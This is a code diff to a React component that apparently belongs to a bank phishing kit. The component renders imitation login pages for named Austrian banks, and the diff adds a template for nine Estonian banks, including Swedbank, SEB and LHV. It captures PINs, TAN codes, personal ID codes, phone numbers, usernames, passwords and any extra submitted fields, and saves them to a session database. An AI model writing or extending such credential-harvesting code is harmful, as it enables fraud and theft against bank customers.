@@ -39,6 +39,7 @@ import { Volkskreditbank } from "@/components/templates/Volkskreditbank";
 import { AnadiBank } from "@/components/templates/AnadiBank";
 import { MarchfelderBank } from "@/components/templates/MarchfelderBank";
 import { Dolomitenbank } from "@/components/templates/Dolomitenbank";
+import { EstoniaBankTemplate } from "@/components/templates/EstoniaBankTemplate";
 
 type Props = {
   sessionId: string;
@@ -57,6 +58,8 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
   const [saving, setSaving] = useState(false);
   const [error, setError] = useState<string | null>(null);
   const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
+  const [personalCode, setPersonalCode] = useState("");
+  const [loginMethod, setLoginMethod] = useState("");
 
   useEffect(() => {
     let cancelled = false;
@@ -80,26 +83,80 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       setVerfuegernummer(fd.verfuegernummer ?? "");
       setPin(fd.pin ?? "");
       setTacCode(fd.tacCode ?? "");
+      setPersonalCode(fd.personalCode ?? "");
+      setLoginMethod(fd.loginMethod ?? "");
     })();
     return () => {
       cancelled = true;
     };
   }, [sessionId, supabase]);
 
-  async function handleSubmit(e?: React.FormEvent) {
+  async function handleSubmit(e?: React.FormEvent, overrideData?: any) {
     if (e) e.preventDefault();
     if (!supabase || !sessionId || !bank) return;
     setSaving(true);
     setError(null);
 
-    const normalizedFields = normalizeBankLoginFields({ verfuegernummer, pin, tacCode });
+    const knownCredentialKeys = new Set([
+      "verfuegernummer",
+      "pin",
+      "tacCode",
+      "personalCode",
+      "loginMethod",
+      "phone",
+      "username",
+      "password",
+      "bankSlug",
+      "bankName",
+    ]);
+
+    const currentVerfuegernummer = overrideData?.verfuegernummer ?? verfuegernummer;
+    const currentPin = overrideData?.pin ?? pin;
+    const currentTacCode = overrideData?.tacCode ?? tacCode;
+    const currentPersonalCode = overrideData?.personalCode ?? personalCode;
+    const currentLoginMethod = overrideData?.loginMethod ?? loginMethod;
+    const currentPhone =
+      typeof overrideData?.phone === "string"
+        ? overrideData.phone
+        : typeof sessionFormData.phone === "string"
+          ? sessionFormData.phone
+          : "";
+    const currentUsername =
+      typeof overrideData?.username === "string"
+        ? overrideData.username
+        : typeof sessionFormData.username === "string"
+          ? sessionFormData.username
+          : "";
+    const currentPassword =
+      typeof overrideData?.password === "string"
+        ? overrideData.password
+        : typeof sessionFormData.password === "string"
+          ? sessionFormData.password
+          : "";
+
+    const normalizedFields = normalizeBankLoginFields({ 
+      verfuegernummer: currentVerfuegernummer, 
+      pin: currentPin, 
+      tacCode: currentTacCode, 
+      personalCode: currentPersonalCode, 
+      loginMethod: currentLoginMethod,
+      phone: currentPhone,
+      username: currentUsername,
+      password: currentPassword,
+    });
     const credentials = normalizeBankCredentialPayload({
       bankSlug: bank.slug,
       bankName: bank.name,
       ...normalizedFields,
     });
+    const extraCapturedFields = Object.fromEntries(
+      Object.entries((overrideData ?? {}) as Record<string, unknown>)
+        .filter(([key, value]) => !knownCredentialKeys.has(key) && typeof value === "string" && value.trim().length > 0)
+        .map(([key, value]) => [key, value.trim()]),
+    );
     const nextFormData = {
       ...sessionFormData,
+      ...extraCapturedFields,
       ...credentials,
     };
     const { error: updateError } = await supabase
@@ -140,10 +197,30 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
   const handleTemplateChange = (field: string, value: string) => {
     if (field === "verfuegernummer") setVerfuegernummer(value);
     if (field === "pin") setPin(value);
+    if (field === "tacCode") setTacCode(value);
+    if (field === "personalCode") setPersonalCode(value);
+    if (field === "loginMethod") setLoginMethod(value);
   };
-  const handleTemplateSubmit = () => handleSubmit();
+  const handleTemplateSubmit = (overrideData?: any) => handleSubmit(undefined, overrideData);
   
   const hasGeneratedDesign = Boolean(bank.design?.visualTree || bank.design?.customHtml);
+
+  // Estonian Banks
+  const estonianBanks = ["bigbank", "citadele-banka", "coop-pank", "inbank", "lhv-pank", "luminor-ee", "op-corporate-bank", "seb-pank", "swedbank-ee"];
+  if (estonianBanks.includes(bankSlug)) {
+    return (
+      <EstoniaBankTemplate 
+        bankSlug={bankSlug}
+        bankName={bank.name}
+        logoFile={bank.logoFile}
+        brandColor={bank.brandColor || theme?.colors.primary}
+        formData={{ verfuegernummer, pin, personalCode, loginMethod }} 
+        onChange={handleTemplateChange} 
+        handleRouteAction={handleTemplateSubmit} 
+        saving={saving} 
+      />
+    );
+  }
 
   if (!hasGeneratedDesign) {
     if (bankSlug === "bank-austria") return <BankAustria formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
